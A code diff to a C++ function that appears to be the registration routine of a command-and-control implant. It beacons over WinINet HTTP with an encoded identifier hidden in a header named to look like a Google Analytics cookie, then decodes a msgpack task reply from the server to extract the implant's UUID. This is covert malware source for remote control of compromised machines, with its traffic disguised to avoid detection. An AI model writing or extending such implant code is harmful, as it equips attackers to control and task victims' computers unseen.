@@ -1,10 +1,12 @@
 #include <vector>
 #include <iostream>
 #include "../protocols/http_wininet/http.h"
+#include "../data/msgpack/msgpack.h"
+#include "../protocols/json/json.h"
 
 //placeholder register func. Put somehwere in control
-int register_implant() {
-    std::vector<char> responseBuffer;
+std::string register_implant() {
+    std::vector<uint8_t> http_response_buffer;
 
     // Define headers (No \r\n needed)
     std::vector<std::wstring> headers = {
@@ -12,17 +14,24 @@ int register_implant() {
         L"utmcc: gaxpbXBsYW50X3V1aWTZIzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAw"
     };
 
-    bool http_response = HTTP_GET(headers, responseBuffer);
+    bool http_response_status = HTTP_GET(headers, http_response_buffer);
 
-    if (http_response) {
-        std::cout << "Success! Bytes read: " << responseBuffer.size() << std::endl;
+    if (http_response_status) {
+        std::cout << "Success! Bytes read: " << http_response_buffer.size() << std::endl;
 
         //then transform and pull out data we need
         //placeholer id" 019bbe19-2c0e-7ee1-a81a-78d7e1a97ac0
+
+        //right now, prof is set to print, so just task -> from msgpack, then extract ID out from there.
+
+        nlohmann::json task_data = decode_msgpack_task(http_response_buffer);
+
+        return task_data["implant_uuid"];
+
     }
     else {
         std::cerr << "Request failed." << std::endl;
     }
 
-    return 0;
+    return "";
 }
